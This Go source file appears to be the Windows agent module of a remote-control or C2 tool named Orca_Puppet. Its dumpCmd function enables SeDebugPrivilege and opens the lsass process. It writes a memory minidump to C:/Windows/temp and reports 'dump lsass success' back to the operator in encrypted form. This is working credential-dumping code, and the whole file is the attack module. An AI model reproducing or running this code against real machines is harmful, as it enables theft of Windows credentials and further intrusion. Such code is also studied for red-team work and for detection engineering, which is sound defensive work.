//go:build amd64 && windows
// +build amd64,windows

package controller

import (
	"Orca_Puppet/cli/cmdopt/dumpopt"
	"Orca_Puppet/cli/cmdopt/fileopt"
	"Orca_Puppet/cli/common"
	"Orca_Puppet/define/colorcode"
	"Orca_Puppet/define/config"
	"Orca_Puppet/tools/crypto"
	"fmt"
	"golang.org/x/sys/windows"
	"os"
)

func dumpCmd(sendUserId, decData string) {
	timeStr := decData
	_pid, err := dumpopt.FindPid()
	if err != nil {
		data := colorcode.OutputMessage(colorcode.SIGN_ERROR, err.Error())
		outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
		common.SendFailMsg(sendUserId, common.ClientId, "dump_ret", outputMsg)
		return
	}
	err = dumpopt.SetSeDebugPrivilege()
	if err != nil {
		data := colorcode.OutputMessage(colorcode.SIGN_ERROR, err.Error())
		outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
		common.SendFailMsg(sendUserId, common.ClientId, "dump_ret", outputMsg)
		return
	}

	pHandle, err := windows.OpenProcess(windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ, false, uint32(_pid))
	if err != nil {
		data := colorcode.OutputMessage(colorcode.SIGN_ERROR, err.Error())
		outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
		common.SendFailMsg(sendUserId, common.ClientId, "dump_ret", outputMsg)
		return
	}
	defer func(fd windows.Handle) {
		err := windows.Close(fd)
		if err != nil {
			data := colorcode.OutputMessage(colorcode.SIGN_ERROR, err.Error())
			outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
			common.SendFailMsg(sendUserId, common.ClientId, "dump_ret", outputMsg)
			return
		}
	}(pHandle)
	if !fileopt.IsDir("C:/Windows/temp") {
		err = os.Mkdir("C:/Windows/temp", 0666)
	}
	saveName := fmt.Sprintf("C:/Windows/temp/%s.dmp", timeStr)
	fileName, _ := windows.UTF16PtrFromString(saveName)
	fHandle, err := windows.CreateFile(fileName, windows.GENERIC_WRITE, windows.FILE_SHARE_WRITE, nil, windows.CREATE_ALWAYS, windows.FILE_ATTRIBUTE_NORMAL, 0)
	if err != nil {
		data := colorcode.OutputMessage(colorcode.SIGN_ERROR, err.Error())
		outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
		common.SendFailMsg(sendUserId, common.ClientId, "dump_ret", outputMsg)
		return
	}
	defer func(fd windows.Handle) {
		err := windows.Close(fd)
		if err != nil {
			data := colorcode.OutputMessage(colorcode.SIGN_ERROR, err.Error())
			outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
			common.SendFailMsg(sendUserId, common.ClientId, "dump_ret", outputMsg)
			return
		}
	}(fHandle)
	err = dumpopt.MiniDumpWriteDump(pHandle, uint32(_pid), fHandle, 0x00000002)
	if err != nil {
		data := colorcode.OutputMessage(colorcode.SIGN_ERROR, err.Error())
		outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
		common.SendFailMsg(sendUserId, common.ClientId, "dump_ret", outputMsg)
		return
	}
	data := colorcode.OutputMessage(colorcode.SIGN_SUCCESS, "dump lsass success")
	outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
	common.SendSuccessMsg(sendUserId, common.ClientId, "dump_ret", outputMsg)

}
